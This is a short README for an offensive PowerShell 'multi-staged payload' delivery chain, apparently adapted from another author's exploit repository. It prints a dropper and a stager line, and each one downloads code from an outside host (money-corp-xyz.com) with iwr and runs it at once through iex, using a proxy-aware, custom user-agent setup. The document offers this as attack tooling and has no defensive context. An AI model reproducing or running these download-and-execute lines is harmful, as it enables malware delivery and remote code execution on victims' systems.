# Multi-Staged-Payload

All credits to @kmkz_security

A cleaner version of https://github.com/kmkz/exploit/blob/master/Full-payload-delivery-chain.ps1


Changes:

psh-cmd payload:
COMPSEC -> C:\Windows\System32\cmd.exe 

Create_Dropper.ps1:
$Payload = "$ProxyAware;iwr http://www.money-corp-xyz.com/stager -UseBasicParsing -UserAgent '$UA'|iex"

Stager:
$ProxyAware;iwr http://www.money-corp-xyz.com/psh-cmd.load -UseBasicParsing -UserAgent $UA|iex


